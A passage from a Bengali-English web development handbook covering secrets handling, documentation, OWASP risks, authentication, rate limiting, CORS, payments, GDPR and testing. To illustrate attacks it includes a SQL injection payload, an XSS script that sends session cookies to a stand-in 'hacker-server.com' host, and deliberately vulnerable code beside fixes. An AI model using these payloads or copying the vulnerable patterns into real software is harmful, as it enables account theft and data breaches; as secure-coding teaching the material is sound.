DATABASE_URL=postgresql://admin:realP@ssw0rd@localhost:5432/mydb_dev
JWT_SECRET=a8f2k4m6p9q1s3u5w7y9...
STRIPE_SECRET_KEY=sk_test_51H7...
NEXT_PUBLIC_API_URL=http://localhost:3000/api
```

### Environment Variables-এর নিয়ম

| নিয়ম | কেন |
|------|-----|
| `.env` ফাইল `.gitignore`-এ থাকবে | Secrets leak হওয়া ঠেকাতে |
| `.env.example` commit করো actual values ছাড়া | নতুন developer যেন জানে কী কী variable দরকার |
| `NEXT_PUBLIC_` prefix শুধু সেই variables-এ যেগুলো browser-এ expose হতে পারে | এটা ছাড়া ব্রাউজার থেকে access করা যায় না (Next.js-এর নিয়ম) |
| প্রতিটা environment-এ আলাদা API key ব্যবহার করো | Test environment-এর key leak হলেও production safe |
| Production secrets Environment variable হিসেবে hosting platform-এ সেট করো | `.env` ফাইল সার্ভারে রাখার চেয়ে safe |

---

## 2.5 Documentation Standards

### README.md — প্রতিটা প্রজেক্টের "ফ্রন্ট ডোর"

যেকোনো ডেভেলপার (বা ভবিষ্যতে তুমি নিজে) প্রজেক্টে ঢুকে প্রথম যে ফাইলটা পড়বে সেটা README। একটা ভালো README-তে থাকবে:

```markdown
# Project Name

এক লাইনে প্রজেক্ট কী করে।

## 🚀 Tech Stack
- Frontend: Next.js 14, TypeScript, Tailwind CSS
- Backend: Node.js, Prisma ORM
- Database: PostgreSQL
- Hosting: Vercel

## 📋 Prerequisites
- Node.js >= 18
- PostgreSQL >= 15
- npm >= 9

## ⚡ Quick Start

1. Clone the repo
   git clone https://github.com/username/project.git
   cd project

2. Install dependencies
   npm install

3. Set up environment variables
   cp .env.example .env.local
   # Edit .env.local with your actual values

4. Set up database
   npx prisma migrate dev
   npx prisma db seed

5. Run development server
   npm run dev

## 📁 Project Structure
[ফোল্ডার স্ট্রাকচারের সংক্ষিপ্ত বিবরণ]

## 📝 Available Scripts
| Command | Description |
|---------|-------------|
| npm run dev | Start dev server |
| npm run build | Production build |
| npm run test | Run tests |
| npm run lint | Run linter |

## 🤝 Contributing
[কীভাবে contribute করতে হবে]

## 📄 License
[License info]
```

### Inline Comment Convention

```typescript
// ✅ ভালো comment — "কেন" explain করছে
// We use a 30-minute window instead of exact time matching
// because user clocks may be slightly out of sync
const TOKEN_EXPIRY_BUFFER = 30 * 60 * 1000;

// ❌ খারাপ comment — কোড যা করছে সেটাই repeat করছে
// Set x to 5
const x = 5;

// ✅ TODO comment — future improvement track করতে
// TODO(your-name): Implement pagination when product count > 1000
// See: https://github.com/project/issues/42

// ⚠️ HACK/FIXME comment — workaround document করতে
// FIXME: This is a temporary fix for the timezone issue.
// Proper solution: store all dates in UTC. Ref: #87
```

---

# 3. 🔒 সিকিউরিটি (সবচেয়ে গুরুত্বপূর্ণ সেকশন)

> **কেন সিকিউরিটি এত গুরুত্বপূর্ণ?**
> একটা দোকানে তালা না দিলে চোর আসবে — এটা সবাই বোঝে। কিন্তু ওয়েবসাইটে "তালা" না দিলে যে হ্যাকাররা আসবে — এটা অনেকে realize করে না। একটা সিকিউরিটি breach মানে:
> - ইউজারদের personal data চুরি
> - ক্লায়েন্টের বিজনেস reputation ধ্বংস
> - Legal consequences (মামলা, জরিমানা)
> - তোমার নিজের professional reputation নষ্ট
>
> **মনে রাখো:** সিকিউরিটি কোনো "extra feature" না — এটা foundation-এর অংশ। বাড়ির ভিত্তিতে যেমন রড-সিমেন্ট দিতে হয়, ওয়েব অ্যাপেও তেমনি সিকিউরিটি built-in থাকতে হবে।

---

## 3.1 OWASP Top 10 — সবচেয়ে কমন সিকিউরিটি ঝুঁকি

**OWASP (Open Worldwide Application Security Project)** = একটা non-profit organization যেটা ওয়েব application security-র সবচেয়ে বড় reference। তাদের "Top 10" হলো — সবচেয়ে common এবং dangerous ১০টা security vulnerability-র তালিকা।

> 📦 **Vulnerability (ভালনারেবিলিটি)** = তোমার application-এর একটা দুর্বল জায়গা যেটা exploit (ব্যবহার) করে হ্যাকার ক্ষতি করতে পারে।

### 3.1.1 🔴 Injection (ইনজেকশন) — #1 ঝুঁকি

**কী?** হ্যাকার তোমার application-এ malicious (ক্ষতিকারক) code "inject" (ঢুকিয়ে দেওয়া) করে — সাধারণত input field-এর মাধ্যমে।

**সবচেয়ে কমন:** SQL Injection

**Analogy:** ধরো তুমি একটা লাইব্রেরিতে গিয়ে বললে "আমাকে Harry Potter বইটা দাও"। কিন্তু কেউ যদি বলে "আমাকে Harry Potter দাও; আর সাথে সব বইয়ের চাবিও দিয়ে দাও" — এবং লাইব্রেরিয়ান সেটা blindly মেনে নেয় — এটাই injection।

```javascript
// ❌ VULNERABLE — SQL Injection সম্ভব
const query = `SELECT * FROM users WHERE email = '${userInput}'`;
// হ্যাকার যদি input দেয়: ' OR '1'='1' --
// তাহলে query হয়ে যায়:
// SELECT * FROM users WHERE email = '' OR '1'='1' --'
// মানে: সব users-এর data চলে আসবে!

// ✅ SAFE — Parameterized query ব্যবহার করো
const query = 'SELECT * FROM users WHERE email = $1';
const result = await db.query(query, [userInput]);
// এখানে $1-এ userInput একটা plain string হিসেবে treat হয়, code হিসেবে না

// ✅ BETTER — ORM ব্যবহার করো (Prisma, Drizzle)
const user = await prisma.user.findUnique({
  where: { email: userInput }
});
// ORM automatically parameterization handle করে
```

### 3.1.2 🔴 Cross-Site Scripting (XSS)

**কী?** হ্যাকার তোমার ওয়েবসাইটে malicious JavaScript inject করে, যেটা অন্য users-এর ব্রাউজারে চলে।

**Analogy:** ধরো কেউ তোমার দেয়ালে একটা poster লাগালো যেটা দেখতে সুন্দর, কিন্তু ভেতরে একটা hidden camera আছে — যারা poster দেখছে তাদের সব monitor করা হচ্ছে।

**উদাহরণ:** একটা comment section-এ কেউ comment হিসেবে লিখলো:
```html
<script>
  // ইউজারের session cookie চুরি করে হ্যাকারের সার্ভারে পাঠাচ্ছে
  fetch('https://hacker-server.com/steal?cookie=' + document.cookie);
</script>
```

এখন যে কেউ এই comment দেখবে, তার browser-এ এই script চলবে!

**প্রতিরোধ:**

```javascript
// ❌ VULNERABLE — raw HTML render করা
element.innerHTML = userInput;  // userInput-এ <script> থাকলে execute হবে!

// ✅ SAFE — textContent ব্যবহার করো (HTML parse হবে না)
element.textContent = userInput;

// ✅ React/Next.js-এ — default-এ safe (auto-escaping হয়)
return <p>{userInput}</p>;  // React automatically HTML escape করে

// ⚠️ কিন্তু dangerouslySetInnerHTML ব্যবহার করলে সাবধান!
// শুধু trusted content-এর জন্য, এবং তার আগে sanitize করো
import DOMPurify from 'dompurify';
return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />;
```

> 📦 **DOMPurify** = একটা library যেটা HTML থেকে malicious script বাদ দিয়ে safe HTML রাখে।

### 3.1.3 🔴 Cross-Site Request Forgery (CSRF)

**কী?** হ্যাকার ইউজারকে trick করে তোমার ওয়েবসাইটে unwanted action করায় — ইউজার নিজে জানেও না।

**Analogy:** ধরো তুমি ব্যাংকে logged in আছো। হ্যাকার তোমাকে একটা ইমেইলে "এখানে ক্লিক করো" বলে লিংক দিলো। তুমি ক্লিক করলে — সেই লিংক আসলে তোমার ব্যাংকে "transfer $1000 to hacker" request পাঠায়। যেহেতু তুমি logged in, ব্যাংক ভাবে তুমিই request করেছো!

**প্রতিরোধ:**

```javascript
// 1. CSRF Token ব্যবহার করো
// প্রতিটা form-এ একটা unique, server-generated token থাকবে
// Server check করবে token valid কিনা — হ্যাকারের page-এ এই token থাকবে না

// 2. SameSite Cookie attribute ব্যবহার করো
res.cookie('session', sessionId, {
  httpOnly: true,     // JavaScript থেকে cookie access করা যাবে না
  secure: true,       // শুধু HTTPS-এ পাঠাবে
  sameSite: 'strict'  // অন্য site থেকে request-এ cookie পাঠাবে না
});

// 3. Critical action-এ re-authentication চাইতে পারো
// যেমন: password change, payment — আবার password চাইতে পারো
```

### 3.1.4 🔴 Broken Authentication (ভেঙে পড়া Authentication)

**কী?** Login/registration system-এ দুর্বলতা — যেমন weak password allow করা, brute force attack ঠেকাতে না পারা, session ঠিকমতো manage না করা।

**Brute Force Attack** = হ্যাকার automated tool দিয়ে হাজার হাজার password combination চেষ্টা করে — "password123", "admin123", "qwerty"...

**প্রতিরোধ — পরের সেকশনে (3.2) বিস্তারিত**

### 3.1.5 🔴 Broken Access Control (ভেঙে পড়া Access Control)

**কী?** ইউজার এমন কিছু করতে পারছে যা তার করার কথা না — যেমন normal user admin panel access করছে, বা user A, user B-এর data দেখতে পারছে।

**উদাহরণ:**
```
GET /api/users/123/invoices  ← User 123 তার নিজের invoices দেখছে (✅ OK)
GET /api/users/456/invoices  ← User 123 এই URL-এ গেলে user 456-এর data দেখতে পাচ্ছে (❌ BROKEN!)
```

**প্রতিরোধ:**

```javascript
// ❌ VULNERABLE — শুধু URL parameter দেখে data দিচ্ছে
app.get('/api/users/:userId/invoices', async (req, res) => {
  const invoices = await db.getInvoices(req.params.userId);
  return res.json(invoices);
});

// ✅ SAFE — logged-in user-এর ID verify করো
app.get('/api/users/:userId/invoices', authMiddleware, async (req, res) => {
  // req.user.id আসছে JWT/session থেকে — এটা tamper করা যায় না
  if (req.params.userId !== req.user.id && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Access denied' });
  }
  const invoices = await db.getInvoices(req.params.userId);
  return res.json(invoices);
});
```

### 3.1.6 🔴 Security Misconfiguration

**কী?** Default settings বদলানো হয়নি, error messages-এ অতিরিক্ত info দেওয়া হচ্ছে, unnecessary features চালু আছে।

```javascript
// ❌ VULNERABLE — Detailed error message production-এ দেখানো
app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack,           // হ্যাকার দেখতে পাবে কোন file-এ error হচ্ছে!
    database: err.query         // এমনকি database query-ও দেখতে পাবে!
  });
});

// ✅ SAFE — Production-এ generic error, dev-এ detailed
app.use((err, req, res, next) => {
  console.error(err);  // Server log-এ full error রাখো (শুধু তুমি দেখতে পাবে)
  
  if (process.env.NODE_ENV === 'production') {
    res.status(500).json({ error: 'Something went wrong' });
  } else {
    res.status(500).json({ error: err.message, stack: err.stack });
  }
});
```

### 3.1.7 🔴 Insecure Deserialization

**কী?** Application যখন বাইরে থেকে আসা serialized data (যেমন JSON, অথবা binary format) blindly trust করে process করে।

> **Serialization** = data কে একটা storable/sendable format-এ রূপান্তর (যেমন: JavaScript object → JSON string)। **Deserialization** = উল্টোটা।

**প্রতিরোধ:**
- বাইরে থেকে আসা data সবসময় validate করো
- JWT token-এ sensitive data রাখো না, শুধু user ID রাখো, বাকি data server থেকে fetch করো
- JSON.parse() এর output blindly trust করো না — schema validation করো

---

## 3.2 Authentication ও Authorization Best Practices

**Authentication (AuthN)** = "তুমি কে?" — ইউজার prove করছে সে কে (login)
**Authorization (AuthZ)** = "তুমি কী করতে পারবে?" — ইউজারের permission check (admin পারবে, normal user পারবে না)

### Password Hashing

**Hashing** = password কে একটা irreversible (উল্টানো যায় না) format-এ convert করা। ডাটাবেজে plain password না রেখে hash রাখো।

```javascript
// 📦 bcrypt — password hashing-এর জন্য industry standard library
import bcrypt from 'bcrypt';

// Registration-এ — password hash করে store করো
const SALT_ROUNDS = 12;  // যত বেশি, তত secure, কিন্তু তত ধীর
const hashedPassword = await bcrypt.hash(plainPassword, SALT_ROUNDS);
// hashedPassword = "$2b$12$LJ3m4..." (original password বের করা practically impossible)

// Login-এ — submitted password আর stored hash compare করো
const isMatch = await bcrypt.compare(submittedPassword, storedHash);
if (!isMatch) {
  // ⚠️ "Wrong password" না বলে "Invalid credentials" বলো
  // কারণ "wrong password" বললে হ্যাকার বুঝবে email টা valid — শুধু password ভুল
  return res.status(401).json({ error: 'Invalid email or password' });
}
```

### JWT (JSON Web Token) হ্যান্ডলিং

**JWT** = একটা encoded token যেটা ইউজারের identity তথ্য ধারণ করে। Login-এর পর server এটা issue করে, client প্রতিটা request-এ এটা পাঠায় — server verify করে বোঝে কোন ইউজার request করছে।

```javascript
import jwt from 'jsonwebtoken';

// ✅ Token তৈরি করা (Login-এর পর)
const token = jwt.sign(
  {
    userId: user.id,       // শুধু user ID রাখো
    role: user.role         // Role-based access control-এর জন্য
    // ⚠️ কখনো password, email, sensitive data JWT-তে রাখো না!
    // কারণ JWT decode করা সহজ (base64) — যেকেউ পড়তে পারে
  },
  process.env.JWT_SECRET,   // Secret key — env variable থেকে আসবে
  {
    expiresIn: '15m',       // ✅ Short-lived access token (15 মিনিট)
    issuer: 'your-app-name'
  }
);

// ✅ Refresh Token strategy — access token expire হলে নতুন নিতে
const refreshToken = jwt.sign(
  { userId: user.id },
  process.env.JWT_REFRESH_SECRET,
  { expiresIn: '7d' }       // Refresh token দীর্ঘমেয়াদী
);

// Refresh token database-এ store করো (revoke করার জন্য)
// Access token মেমোরিতে রাখো, refresh token httpOnly cookie-তে
```

### Role-Based Access Control (RBAC)

```javascript
// middleware/authorize.js
function authorize(...allowedRoles) {
  // allowedRoles = ['admin', 'editor'] — কারা এই route access করতে পারবে
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ error: 'Not authenticated' });
    }
    if (!allowedRoles.includes(req.user.role)) {
      return res.status(403).json({ error: 'Not authorized' });
    }
    next(); // সব ঠিক, পরবর্তী handler-এ যাও
  };
}

// ব্যবহার:
app.get('/api/admin/users', authorize('admin'), adminController.listUsers);
app.post('/api/posts', authorize('admin', 'editor'), postController.create);
app.get('/api/posts', authorize('admin', 'editor', 'user'), postController.list);
```

### ✅ Authentication চেকলিস্ট

- [ ] Password bcrypt দিয়ে hash করে store হচ্ছে (minimum 12 salt rounds)
- [ ] Password policy enforce হচ্ছে (minimum 8 characters, mix of upper/lower/number/special)
- [ ] Login error message-এ "wrong password" vs "wrong email" আলাদা করা হচ্ছে না
- [ ] JWT-তে sensitive data রাখা হচ্ছে না
- [ ] Access token short-lived (15-30 min), refresh token দিয়ে renew হচ্ছে
- [ ] Brute force protection আছে (rate limiting — একই IP থেকে ৫ বার ভুল password দিলে temporary block)
- [ ] Session/token logout-এ properly invalidate হচ্ছে
- [ ] "Forgot password" flow secure — reset token time-limited, single-use
- [ ] OAuth (Google/GitHub login) ব্যবহার করলে state parameter ব্যবহার হচ্ছে (CSRF prevention)

---

## 3.3 Secrets / API Key Management

🔒 **Golden Rule: সিক্রেটস কোডে থাকবে না — কখনোই না।**

**Secrets** = যেকোনো sensitive credential — API key, database password, JWT secret, third-party service key।

### সিক্রেটস কোথায় রাখবে

| Environment | কোথায় রাখবে | Example Tool/Platform |
|-------------|-------------|----------------------|
| **Local Dev** | `.env.local` ফাইল (gitignored) | dotenv package |
| **CI/CD** | Platform-এর secret management | GitHub Secrets, GitLab CI Variables |
| **Staging/Production** | Hosting platform-এর env config | Vercel Environment Variables, AWS Parameter Store |
| **Enterprise/Advanced** | Dedicated secret manager | HashiCorp Vault, AWS Secrets Manager, Doppler |

> 📦 **Doppler** = একটা secrets management tool যেটা সব environment-এর secrets এক জায়গায় manage করতে দেয়। ছোট-মাঝারি প্রজেক্টের জন্য free tier আছে।

### ⚠️ যদি ভুলে Secret Commit হয়ে যায়

**DON'T PANIC, কিন্তু দ্রুত act করো:**

1. **Secret immediately revoke/rotate করো** — নতুন key generate করো এবং পুরানোটা disable করো
2. **Git history থেকে remove করো:**
   ```bash
   # 📦 BFG Repo-Cleaner — git history থেকে sensitive data মুছে ফেলার tool
   bfg --replace-text passwords.txt  my-repo.git
   ```
3. **Force push করো** (⚠️ টিমে কাজ করলে আগে সবাইকে জানাও)
4. **GitHub-এ secret scanning alert চালু করো** — GitHub automatically detect করে যদি কোনো known API key commit হয়

💡 **প্রো টিপ:** `git-secrets` (AWS-এর tool) install করো — এটা commit করার আগেই check করে secret আছে কিনা এবং commit block করে দেয়।

---

## 3.4 Input Validation ও Sanitization

**Input Validation** = ইউজারের দেওয়া data "আমি যা expect করছি তা-ই কিনা" check করা (সঠিক format, length, type)
**Sanitization** = ইউজারের data থেকে potentially dangerous content বাদ দেওয়া/escape করা

> **মনে রাখো:** ইউজারের কোনো input কখনো blindly trust করো না — এমনকি dropdown বা hidden field-এর value-ও না! কারণ হ্যাকার browser-এর DevTools দিয়ে যেকোনো value পাল্টাতে পারে।

```javascript
// 📦 Zod — TypeScript-first schema validation library
// এটা দিয়ে input-এর expected shape define করো, ভুল হলে error message দেয়
import { z } from 'zod';

const createUserSchema = z.object({
  email: z.string()
    .email('Valid email দিতে হবে')
    .max(255, 'Email 255 character-এর বেশি হতে পারবে না'),
  password: z.string()
    .min(8, 'Password কমপক্ষে 8 character হতে হবে')
    .regex(/[A-Z]/, 'কমপক্ষে একটা uppercase letter দরকার')
    .regex(/[0-9]/, 'কমপক্ষে একটা number দরকার')
    .regex(/[^A-Za-z0-9]/, 'কমপক্ষে একটা special character দরকার'),
  name: z.string()
    .min(2, 'Name কমপক্ষে 2 character')
    .max(100, 'Name 100 character-এর বেশি হতে পারবে না')
    .trim(),
  age: z.number()
    .int('পূর্ণসংখ্যা হতে হবে')
    .min(13, 'কমপক্ষে 13 বছর বয়স হতে হবে')
    .max(120)
    .optional()
});

// API route-এ ব্যবহার:
app.post('/api/users', (req, res) => {
  const result = createUserSchema.safeParse(req.body);
  
  if (!result.success) {
    return res.status(400).json({
      error: 'Validation failed',
      details: result.error.issues
    });
  }
  
  // result.data এখন validated ও typed — safe to use
  const user = await createUser(result.data);
});
```

⚠️ **Critical Rule: Client-side validation + Server-side validation — দুটোই দরকার।**
- Client-side (browser-এ) = UX-এর জন্য — ইউজারকে দ্রুত feedback দিতে
- Server-side (backend-এ) = Security-এর জন্য — কারণ client-side validation কেউ bypass করতে পারে (DevTools দিয়ে)

---

## 3.5 Rate Limiting

**Rate Limiting** = একটা নির্দিষ্ট সময়ে একটা IP/user থেকে কতগুলো request আসতে পারবে তা সীমিত করা। না করলে:
- **Brute force attack:** হ্যাকার প্রতি সেকেন্ডে হাজারো password try করতে পারে
- **DDoS (Distributed Denial of Service):** এত request পাঠায় যে সার্ভার crash করে
- **API abuse:** কেউ তোমার free API unlimited ব্যবহার করে

```javascript
// 📦 express-rate-limit — Express.js-এ rate limiting-এর জন্য
import rateLimit from 'express-rate-limit';

// General API rate limit
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 মিনিটের window
  max: 100,                    // এই window-এ সর্বোচ্চ 100 requests
  message: { error: 'Too many requests, please try again later' },
  standardHeaders: true,
});

// Login route-এ stricter limit
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,                     // ১৫ মিনিটে সর্বোচ্চ ৫ বার login try
  message: { error: 'Too many login attempts. Please try again after 15 minutes.' }
});

app.use('/api/', apiLimiter);
app.post('/api/auth/login', loginLimiter, authController.login);
```

---

## 3.6 CORS (Cross-Origin Resource Sharing) কনফিগারেশন

**CORS কী?**

ধরো তোমার frontend চলছে `https://myapp.com`-এ আর backend API চলছে `https://api.myapp.com`-এ। Browser default-এ এক origin (domain) থেকে অন্য origin-এ request পাঠাতে দেয় না — এটা security feature। CORS হলো server-এর তরফ থেকে বলা "এই এই domain থেকে request আসলে allow করো।"

```javascript
// 📦 cors — Express.js CORS middleware
import cors from 'cors';

// ❌ DANGEROUS — সবাইকে allow করছো (development ছাড়া করো না)
app.use(cors());  // Access-Control-Allow-Origin: *

// ✅ SAFE — শুধু তোমার frontend-এর domain allow করো
app.use(cors({
  origin: [
    'https://myapp.com',
    'https://www.myapp.com',
    ...(process.env.NODE_ENV === 'development' ? ['http://localhost:3000'] : [])
  ],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization'],
}));
```

---

## 3.7 HTTPS/SSL ও Security Headers

### HTTPS/SSL

**HTTPS** = HTTP-এর secure version — তোমার ব্রাউজার আর সার্ভারের মধ্যে সব communication encrypted (কোডেড) হয়ে যায়। কেউ মাঝপথে data দেখতে পারে না।

**SSL/TLS Certificate** = HTTPS চালু করার জন্য যে "প্রমাণপত্র" দরকার।

- 📦 **Let's Encrypt** — ফ্রি SSL certificate provider। Vercel, Netlify, Cloudflare ব্যবহার করলে automatic SSL পাবে।
- Production-এ HTTPS ছাড়া কোনো ওয়েবসাইট চালাবে না — browser "Not Secure" দেখাবে, Google SEO-তে penalty দিবে, ইউজাররা trust করবে না।

### Security Headers

**Security Headers** = HTTP response-এ কিছু special header যোগ করা যা browser-কে বলে কীভাবে তোমার site safely handle করতে হবে।

```javascript
// 📦 helmet — Express.js-এ security headers সেট করার package
import helmet from 'helmet';
app.use(helmet());
```

| Header | কী করে | কেন দরকার |
|--------|--------|----------|
| **Content-Security-Policy (CSP)** | কোন source থেকে script/style/image load হতে পারবে তা বলে | XSS attack কমায় — unauthorized script চলতে পারে না |
| **Strict-Transport-Security (HSTS)** | Browser-কে বলে সবসময় HTTPS ব্যবহার করতে | HTTP থেকে redirect হওয়ার মাঝখানে attack ঠেকায় |
| **X-Content-Type-Options** | Browser-কে file type "sniffing" বন্ধ করতে বলে | Malicious file correct type হিসেবে execute হওয়া ঠেকায় |
| **X-Frame-Options** | তোমার site অন্য কেউ iframe-এ embed করতে পারবে কিনা | Clickjacking attack ঠেকায় |
| **Referrer-Policy** | অন্য site-এ যাওয়ার সময় কতটুকু URL info পাঠাবে | Privacy protect করে |
| **Permissions-Policy** | কোন browser features (camera, microphone, geolocation) ব্যবহার হতে পারবে | Unauthorized access ঠেকায় |

---

## 3.8 Dependency Vulnerability Scanning

তোমার প্রজেক্ট শুধু তোমার কোড না — npm packages-ও (তৃতীয় পক্ষের কোড)। এই packages-এ vulnerability থাকতে পারে।

```bash
# Built-in npm audit — known vulnerabilities check করে
npm audit

# Automatic fix (safe updates)
npm audit fix
```

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
```

> 📦 **Snyk** = আরেকটা জনপ্রিয় vulnerability scanning tool, npm-ের চেয়ে বেশি comprehensive database আছে। ফ্রি tier আছে।

### ✅ Security চেকলিস্ট (প্রতিটা প্রজেক্টে verify করো)

- [ ] SQL injection prevention — parameterized queries/ORM ব্যবহার হচ্ছে
- [ ] XSS prevention — user input escape/sanitize হচ্ছে
- [ ] CSRF protection আছে (SameSite cookies, CSRF tokens)
- [ ] Broken access control check — প্রতিটা API endpoint-এ authorization verify হচ্ছে
- [ ] Passwords bcrypt দিয়ে hash হচ্ছে
- [ ] JWT properly implemented (short expiry, no sensitive data in payload)
- [ ] Rate limiting আছে (বিশেষ করে login, registration, API endpoints)
- [ ] CORS properly configured (wildcard `*` নয়, specific origins)
- [ ] HTTPS/SSL চালু আছে
- [ ] Security headers (helmet) সেট আছে
- [ ] `.env` file gitignored এবং secrets code-এ নেই
- [ ] `npm audit` চালানো হয়েছে, critical vulnerabilities নেই
- [ ] Dependabot / Snyk enabled আছে
- [ ] Error messages-এ sensitive information (stack trace, db queries) expose হচ্ছে না
- [ ] File upload থাকলে — file type validation, size limit, malware scan করা হচ্ছে
- [ ] Admin routes protected আছে (rate limited + role check)

---

## 3.9 Payment/Sensitive Data Handling

যদি তোমার app-এ payment processing থাকে, তাহলে অতিরিক্ত সতর্কতা দরকার।

### PCI DSS Compliance Overview

**PCI DSS (Payment Card Industry Data Security Standard)** = credit/debit card data handle করার জন্য international security standard। এটা follow না করলে:
- Fine হতে পারে ($5,000 - $500,000 per incident)
- Payment processing capability হারাতে পারো
- Legal liability আসতে পারে

**সবচেয়ে সহজ approach:**

🔒 **কখনোই নিজে card data collect/store করো না!**

```javascript
// ✅ CORRECT — Stripe/PayPal-এর hosted payment form ব্যবহার করো
// Card number তোমার server touch করেই না

// Payment flow:
// 1. তোমার server Stripe-এ Payment Intent তৈরি করে
// 2. Frontend-এ Stripe's CardElement card info collect করে
// 3. Card data সরাসরি Stripe-এর server-এ যায় — তোমার server-এ আসে না
// 4. Stripe তোমাকে payment confirmation পাঠায়

// ❌ NEVER — নিজের form-এ card number field রাখা
// <input name="card_number" />  — এটা করলে তোমার PCI compliance scope বিশাল বেড়ে যায়
```

> 📦 **Stripe** = সবচেয়ে জনপ্রিয় online payment processing platform। Developer-friendly API, excellent documentation।
> 📦 **PayPal** = আরেকটা বড় payment platform, বিশেষ করে international payments-এ ব্যবহৃত।

---

## 3.10 Data Privacy ও Compliance

### GDPR (General Data Protection Regulation) — বেসিক ধারণা

**GDPR** = European Union-এর data privacy আইন। তোমার ইউজারদের মধ্যে কেউ EU-তে থাকলে তোমাকে GDPR follow করতে হবে — তুমি যেখানেই থাকো না কেন।

**মূল বিষয়:**

1. **Consent (সম্মতি):** ইউজারের data collect করার আগে explicit permission নাও। "আমাদের newsletter-এ sign up করতে চান?" — pre-checked checkbox রাখো না।

2. **Data Minimization:** শুধু যতটুকু data দরকার ততটুকু collect করো। শুধু newsletter-এর জন্য email দরকার হলে — phone number চেয়ো না।

3. **Right to be Forgotten:** ইউজার চাইলে তার সব data delete করতে হবে।

4. **Data Breach Notification:** Breach (data leak) হলে ৭২ ঘণ্টার মধ্যে authority-কে জানাতে হবে।

### Practical Implementation

```
✅ কুকি কনসেন্ট ব্যানার — ওয়েবসাইটে ঢোকার সময় দেখাও
✅ Privacy Policy page — কী data collect করো, কেন করো, কতদিন রাখো
✅ Terms of Service page — ব্যবহারের শর্তাবলী
✅ Data export option — ইউজার তার data download করতে পারবে
✅ Account delete option — ইউজার account ও সব data মুছে ফেলতে পারবে
```

📦 **Cookie Consent Library:** `react-cookie-consent`, `cookieconsent` — ready-made cookie banner।

---

# 4. 🧪 টেস্টিং

> **কেন টেস্টিং দরকার?**
> "আমার মেশিনে তো কাজ করছে!" — এই কথা বলে ডিপ্লয় করলে, production-এ ইউজাররা bug পায়। একটা airplane চালানোর আগে যেমন চেকলিস্ট দিয়ে সব verify করা হয়, application-ও deploy-এর আগে verify করতে হবে।

---

## 4.1 Testing Pyramid (টেস্টিং পিরামিড)

```
        ╱╲
       ╱  ╲
      ╱ E2E╲        ← কম সংখ্যক, ধীর, কিন্তু real user experience test করে
     ╱──────╲
    ╱ Integr-╲      ← মাঝারি সংখ্যক, components একসাথে কাজ করছে কিনা test করে
   ╱──ation───╲
  ╱    Unit     ╲   ← সবচেয়ে বেশি, দ্রুত, individual function/component test করে
 ╱────────────────╲
```

### Unit Testing

**Unit Test** = একটা individual function বা component ঠিকমতো কাজ করছে কিনা — isolated ভাবে test করা।

📦 **Jest** = JavaScript/TypeScript-এর জন্য সবচেয়ে জনপ্রিয় testing framework।
📦 **Vitest** = Vite-based প্রজেক্টের জন্য, Jest-এর মতো কিন্তু দ্রুত।

```javascript
// lib/utils.ts
export function calculateDiscount(price: number, discountPercent: number): number {
  if (price < 0 || discountPercent < 0 || discountPercent > 100) {
    throw new Error('Invalid input');
  }
  return price - (price * discountPercent / 100);
}

// tests/unit/utils.test.ts
import { calculateDiscount } from '@/lib/utils';

describe('calculateDiscount', () => {
  test('should calculate 20% discount correctly', () => {
    expect(calculateDiscount(1000, 20)).toBe(800);
  });

  test('should return original price for 0% discount', () => {
    expect(calculateDiscount(500, 0)).toBe(500);
  });

  test('should return 0 for 100% discount', () => {
    expect(calculateDiscount(500, 100)).toBe(0);
  });

  test('should throw error for negative price', () => {
    expect(() => calculateDiscount(-100, 20)).toThrow('Invalid input');
  });

  test('should throw error for discount > 100', () => {
    expect(() => calculateDiscount(100, 150)).toThrow('Invalid input');
  });
});
```

### Integration Testing

**Integration Test** = একাধিক component/module একসাথে ঠিকমতো কাজ করছে কিনা — যেমন API route + database + validation একসাথে test করা।

```javascript
// tests/integration/auth.test.ts
describe('POST /api/auth/register', () => {
  test('should register a new user successfully', async () => {
    const response = await app.inject({
      method: 'POST',
      url: '/api/auth/register',
      payload: {
        email: 'newuser@test.com',
        password: 'SecureP@ss123',
        name: 'Test User'
      }
    });

    expect(response.statusCode).toBe(201);
    const body = JSON.parse(response.body);
    expect(body.data.email).toBe('newuser@test.com');
    expect(body.data.password).toBeUndefined(); // Password response-এ আসা উচিত না!
  });

  test('should reject duplicate email', async () => {
    // প্রথমে একজন user তৈরি করো, তারপর same email দিয়ে আবার try করো
    const response = await app.inject({ method: 'POST', url: '/api/auth/register',
      payload: { email: 'duplicate@test.com', password: 'SecureP@ss456', name: 'Second User' }
    });
    expect(response.statusCode).toBe(409); // 409 = Conflict
  });
});
```

### End-to-End (E2E) Testing

**E2E Test** = real user-এর মতো browser-এ গিয়ে button click করে, form fill-up করে — full flow test করা।

📦 **Playwright** = Microsoft-এর E2E testing tool, multiple browsers support করে।

```javascript
// tests/e2e/login.spec.ts
import { test, expect } from '@playwright/test';

test('user can login and see dashboard', async ({ page }) => {
  await page.goto('/login');
  await page.fill('[data-testid="email-input"]', 'user@example.com');
  await page.fill('[data-testid="password-input"]', 'password123');
  await page.click('[data-testid="login-button"]');
  await expect(page).toHaveURL('/dashboard');
  await expect(page.locator('[data-testid="welcome-message"]')).toContainText('Welcome');
});
```

💡 **প্রো টিপ:** Test-এ element select করতে `data-testid` attribute ব্যবহার করো — CSS class বা text content change হলেও test ভাঙবে না।

---

## 4.2 Manual QA চেকলিস্ট

### Cross-Browser Testing

- [ ] Chrome (সবচেয়ে popular)
- [ ] Firefox
- [ ] Safari (especially iOS Safari — অনেক quirk আছে)
- [ ] Edge
- [ ] Mobile browsers (Chrome Mobile, Safari iOS)

📦 **BrowserStack** = real devices আর browsers-এ test করার cloud service।

### Responsive Testing

- [ ] Desktop (1920px, 1440px, 1280px)
- [ ] Tablet (768px, 1024px)
- [ ] Mobile (375px, 390px, 414px)
- [ ] তোমার design কোনো breakpoint-এ "ভাঙে" না
- [ ] Text readable, buttons clickable (touch target minimum 44x44px)
